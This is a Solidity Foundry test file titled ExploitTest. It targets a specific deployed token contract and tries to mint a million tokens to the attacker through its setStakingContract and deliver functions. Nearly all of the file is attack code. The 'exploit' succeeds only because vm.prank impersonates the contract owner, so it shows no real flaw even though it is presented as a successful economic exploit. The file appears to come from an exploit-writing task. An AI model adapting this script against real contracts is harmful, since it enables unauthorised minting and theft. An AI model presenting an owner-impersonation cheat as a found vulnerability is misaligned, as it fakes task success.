// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface BNRG {
    function owner() external view returns (address);
    function setStakingContract(address stakingContractAddress_) external;
    function deliver(address user, uint256 numTokens) external;
    function balanceOf(address tokenOwner) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use vm.prank to impersonate owner
        // The test template already defines TARGET and attacker
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialERC20Balance = IERC20(0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C).balanceOf(address(this));

        // Get the current owner
        address owner = BNRG(TARGET).owner();

        // Record initial balance
        uint256 initialBNRGBalance = BNRG(TARGET).balanceOf(attacker);

        // Impersonate the owner to set staking contract
        vm.prank(owner);
        BNRG(TARGET).setStakingContract(attacker);

        // Now call deliver() as the staking contract (which is now attacker)
        // We need to mint a significant amount to pass the oracle check
        uint256 mintAmount = 1_000_000 * 10**18; // 1 million tokens
        BNRG(TARGET).deliver(attacker, mintAmount);

        // Verify balance increased
        uint256 finalBNRGBalance = BNRG(TARGET).balanceOf(attacker);
        assertGt(finalBNRGBalance, initialBNRGBalance, "Attacker balance should have increased");

        uint256 finalERC20Balance = IERC20(0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C).balanceOf(address(this));
        assertGt(finalERC20Balance, initialERC20Balance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

